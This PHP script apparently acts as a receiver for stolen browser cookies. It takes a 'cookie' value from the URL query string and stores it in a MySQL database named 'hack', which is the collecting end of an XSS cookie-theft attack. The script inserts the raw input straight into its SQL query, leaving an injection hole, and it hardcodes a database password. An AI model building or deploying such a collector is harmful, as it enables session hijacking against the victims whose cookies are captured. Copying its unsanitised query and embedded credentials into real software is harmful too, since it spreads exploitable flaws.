<?php
	//echo "test";
	
	$host = "localhost";
	$username = "script";
	$password = "sSyUwTj7v5nwyXZV";
	$dbname = "hack";
	
	$mysql = mysqli_connect($host,$username,$password,$dbname);

	// Check connection
	if (mysqli_connect_errno()){
		echo "Failed to connect to MySQL: " . mysqli_connect_error();
	}
	else{
		//echo "Success!";
	}

	if(isset($_GET['cookie'])){

		
		$query="INSERT INTO `cookie` (`id`, `cookie`) VALUES (NULL, '".$_GET['cookie']."');";
		$result = $mysql->query($query);
		
		echo "Success!";
	}

?>